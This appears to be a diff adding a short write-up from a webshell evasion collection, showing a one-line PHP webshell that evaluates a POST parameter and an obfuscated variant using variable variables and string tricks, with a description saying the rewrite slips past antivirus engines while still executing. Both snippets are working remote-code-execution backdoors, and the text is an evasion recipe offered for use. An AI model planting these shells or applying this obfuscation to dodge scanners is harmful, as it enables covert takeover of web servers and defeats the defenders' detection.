@@ -1,0 +1,19 @@
+Original webshell sample:
+
+'''
+<?php eval($_POST['x']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php 
+$zeo='dalao';
+$$zeo=$_POST['x'];
+eval(``.$dalao);
+?>
+'''
+
+Description:
+
+This method is the use of a variety of special characters, such as carriage returns, line feeds, blank characters, etc. to interfere with the regular judgment of the antivirus engine, and with  variable variables (i.e. "$$") and other methods to escape the detection of the antivirus engine, and also to ensure that the correctness of the code function and normal execution.
